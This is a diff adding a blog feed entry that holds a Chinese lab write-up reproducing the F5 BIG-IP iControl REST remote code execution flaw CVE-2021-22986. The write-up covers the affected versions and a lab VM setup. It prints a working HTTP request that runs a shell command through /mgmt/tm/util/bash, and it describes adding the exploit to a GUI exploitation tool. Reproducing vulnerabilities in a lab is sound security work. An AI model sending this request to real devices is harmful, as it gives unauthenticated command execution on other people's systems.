@@ -4,6 +4,31 @@
   
   
   <entry>
+    <title>漏洞复现-F5 BIG-IP远程代码执行漏洞(CVE-2021-22986)</title>
+    <link href="/2021/04/04/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-F5%20BIG-IP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-22986)/"/>
+    <url>/2021/04/04/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-F5%20BIG-IP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-22986)/</url>
+    
+    <content type="html"><![CDATA[<blockquote><p>  燕子来时新社，梨花落后清明。</p></blockquote><h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>F5 BIG-IP 是美国 F5 公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。</p><p>CVE-2021-22986 该漏洞允许未经身份验证的攻击者通过BIG-IP管理界面和自身IP地址对iControl REST接口进行网络访问，以执行任意系统命令，创建或删除文件以及禁用服务。</p><h2 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h2><table><thead><tr><th align="center">F5 BIG-IP 16.0.0-16.0.1</th><th>F5 BIG-IP 12.1.0-12.1.5.2</th></tr></thead><tbody><tr><td align="center">F5 BIG-IP 15.1.0-15.1.2</td><td>F5 BIG-IQ 7.1.0-7.1.0.2</td></tr><tr><td align="center">F5 BIG-IP 14.1.0-14.1.3.1</td><td>F5 BIG-IQ 7.0.0-7.0.0.1</td></tr><tr><td align="center">F5 BIG-IP 13.1.0-13.1.3.5</td><td>F5 BIG-IQ 6.0.0-6.1.0</td></tr></tbody></table><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p><a href="https://login.f5.com/resource/registerEmail.do">https://login.f5.com/resource/registerEmail.do</a> 注册好后，下载</p><p><a href="https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&amp;pro=big-ip_v16.x&amp;ver=16.0.1&amp;container=16.0.1_Virtual-Edition&amp;path=&amp;file=&amp;B1=I+Accept">https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&amp;pro=big-ip_v16.x&amp;ver=16.0.1&amp;container=16.0.1_Virtual-Edition&amp;path=&amp;file=&amp;B1=I+Accept</a>  选择ova格式的，可以快速使用vm虚拟机打开，安装完后，用户名：root，密码：default，成功登陆后，输入config输入config ，几次回车即可看到当前ip，访问</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210404144019.png" alt="image-20210404113304697"></p><h4 id="3-1-使用POC攻击"><a href="#3-1-使用POC攻击" class="headerlink" title="3.1 使用POC攻击"></a>3.1 使用POC攻击</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apl">POST &#x2F;mgmt&#x2F;tm&#x2F;util&#x2F;bash HTTP&#x2F;1.1<br>Content-Type: application&#x2F;json<br>User-Agent: Mozilla&#x2F;5.0 (compatible; Baiduspider&#x2F;2.0; +http:&#x2F;&#x2F;www.baidu.com&#x2F;search&#x2F;spider.html)<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q&#x3D;0.9<br>Connection: close<br>Authorization: Basic YWRtaW46QVNhc1M&#x3D;<br>X-F5-Auth-Token: <br>Host: 192.168.1.191<br>Content-Length: 39<br><br>&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c id&quot;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210404144015.png" alt="image-20210404111524871"></p><h2 id="0x04-利用工具编写"><a href="#0x04-利用工具编写" class="headerlink" title="0x04 利用工具编写"></a>0x04 利用工具编写</h2><p>直接使用上次的<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483987&idx=1&sn=2ee31ccbf8588c23e4184fcd3ab251f8&chksm=c2829b4af5f5125c563e437263eec4ebac08f32f2ace3e4bed9f5c8e562bac5299260b847c27#rd">图形化漏洞利用工具</a>编写</p><blockquote><p>图形化漏洞利用工具已更新</p><p>项目地址：<a href="https://github.com/yhy0/ExpDemo-JavaFX">https://github.com/yhy0/ExpDemo-JavaFX</a></p><p>V1.1 </p><p>​    参考冰蝎的代理，添加代理设置，方便走burp调试</p><p>​    优化批量检查逻辑，使用接口，这样每次添加新的漏洞利用时，就不需要修改批量检查的逻辑。</p></blockquote><p>在<code>src/main/java/com/yhy/core</code>下新建<code>CVE_2021_22986</code>类，实现<code>ExploitInterface</code>接口，并实现里面的函数，具体填充，直接将项目中的示例<code>CVE_2020_14882</code> 的内容复制过去，修改一下内容，填充payload即可</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210404144011.png" alt="image-20210404113814410"></p><p>写完后，进入<code>src/main/java/com/yhy/core/Constants.java</code> 和 <code>src/main/java/com/yhy/tools/Tools.java</code>修改</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210404144002.png" alt="image-20210404132413838"></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210404144006.png" alt="image-20210404132702066"></p><p>运行即可。</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210404143957.gif" alt="CVE-2021-22986"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>漏洞复现</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>漏洞复现</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>图形化漏洞利用Demo-JavaFX版</title>
     <link href="/2021/03/23/%E5%9B%BE%E5%BD%A2%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8Demo-JavaFX%E7%89%88/"/>
     <url>/2021/03/23/%E5%9B%BE%E5%BD%A2%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8Demo-JavaFX%E7%89%88/</url>
